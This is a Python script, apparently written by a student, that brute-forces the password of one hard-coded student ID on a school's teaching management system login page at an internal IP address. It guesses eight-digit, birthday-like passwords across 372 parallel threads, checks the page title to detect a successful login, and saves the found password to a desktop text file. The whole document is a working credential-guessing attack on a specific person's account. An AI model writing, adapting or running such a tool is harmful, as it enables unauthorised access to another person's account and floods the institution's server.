
import time
import threading
import requests
from bs4 import BeautifulSoup

couts=0

jieshu = True

username = "160030405"

#各阶段密码生成器
def get_start_pw():
    password_list = [
        1000000,
        2000000,
        3000000,
        4000000,
        5000000,
        6000000,
        7000000,
        8000000,
        9000000,
        10000000,
        11000000,
        12000000,
    ]
    i = 0
    while i<12:
        for j in range(0,31):
            password = password_list[i] + j * 10000
            yield password
        i += 1
o = get_start_pw()
def daohao(num):
    global couts
    global jieshu
    global username
    password = str(o.__next__())
    max_password = str(int(password)+10000)
    if len(max_password) < 8:
        max_password = '0' + max_password
    print(max_password)
    while jieshu:
        couts+=1
        if len(password) < 8:
            password = '0'+password
        if password == max_password:
            try:
                password = str(o.__next__())
            except StopIteration:
                print("退出循环"*10,num)
                break
            max_password = str(int(password) + 10000)
            if len(max_password) < 8:
                max_password = '0' + max_password
            continue
        print("当前尝试密码："+password+"*"*10,couts,num)
        session = requests.Session()
        login_data = {
            'username': username,
            'passwd': password,
            'login': '(unable to decode value)',
        }
        res = session.post("http://172.16.1.99/student/public/login.asp", data=login_data)
        res.encoding = 'gbk'
        soup = BeautifulSoup(res.text,'lxml')
        title = soup.find(name='title')
        if title.text=='教学管理系统 ['+username+']':
            print("-"*60 + "正确的密码是：",password)
            jieshu=False
            f= open(r'C:\Users\ASUSPC\Desktop\嗯.txt',mode='w',encoding='utf-8')
            f.write(password)
            f.close()
            break
        password = int(password)
        password += 1
        password = str(password)
for i in range(372):
    threading.Thread(target=daohao,args=(i,)).start()
    time.sleep(0.1)